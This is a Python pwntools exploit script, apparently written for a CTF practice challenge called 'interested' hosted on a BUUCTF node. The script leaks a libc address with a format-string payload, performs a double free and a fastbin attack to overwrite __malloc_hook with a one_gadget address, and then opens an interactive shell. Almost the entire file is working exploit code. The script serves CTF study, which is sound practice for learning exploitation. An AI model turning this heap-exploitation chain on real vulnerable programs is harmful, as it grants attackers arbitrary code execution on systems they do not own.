import sys
from pwn import *
from ctypes import *
context.log_level='debug'
#context.arch='amd64'
while True :
	# try :
		if len(sys.argv)==1 :
			io=process('./interested')
			# io=process(['./'],env={'LD_PRELOAD':'./'})
			elf=ELF('./interested')
			libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
			one_gadgaet=[0x45216,0x4526a,0xf02a4,0xf1147]
		else :
			io=remote('node3.buuoj.cn',29377)
			elf=ELF('./interested')
			libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
			one_gadgaet=[0x45216,0x4526a,0xf02a4,0xf1147]

		def add(a,b,c,d):
			io.sendlineafter('t to do :','1')
			io.sendlineafter(' : ',str(a))
			io.sendafter(' : ',b)
			io.sendlineafter(' : ',str(c))
			io.sendafter(' : ',d)

		def delete(a):
			io.sendlineafter('to do :','3')
			io.sendlineafter(' : ',str(a))

		def edit(a,b,c):
			io.sendlineafter('to do :','2')
			io.sendlineafter(' : ',str(a))
			io.sendafter(': ',b)
			io.sendafter(': ',c)

		def show(a):
			io.sendlineafter('to do :','4')
			io.sendlineafter(' : ',str(a))
		

		io.recv()
		io.sendline('OreOOrereOOreO%17$p')
		io.sendline('0')
		io.recvuntil('OreOOrereOOreO')
		libc_base=int(io.recvuntil('\n',drop=True),16)-libc.sym['__libc_start_main']-240
		libc.address=libc_base
		system_addr=libc.sym['system']
		bin_sh_addr=libc.search('/bin/sh\x00').next()
		add(0x68,'aaa\n',0x68,'aaa\n')
		add(0x20,'aaa',0x30,'sss')
		delete(1)
		delete(1)
		add(0x68,p64(libc.sym['__malloc_hook']-0x23),0x68,'aaa\n')
		add(0x68,p64(libc.sym['__malloc_hook']-0x23),0x68,'\x00'*0x13+p64(libc_base+0xf02a4))
		delete(2)
		delete(2)









		success('libc_base:'+hex(libc_base))
		# gdb.attach(io)
		# pause()
		io.interactive()

	# except Exception as e:
	# 	io.close()
	# 	continue
	# else:
	# 	continue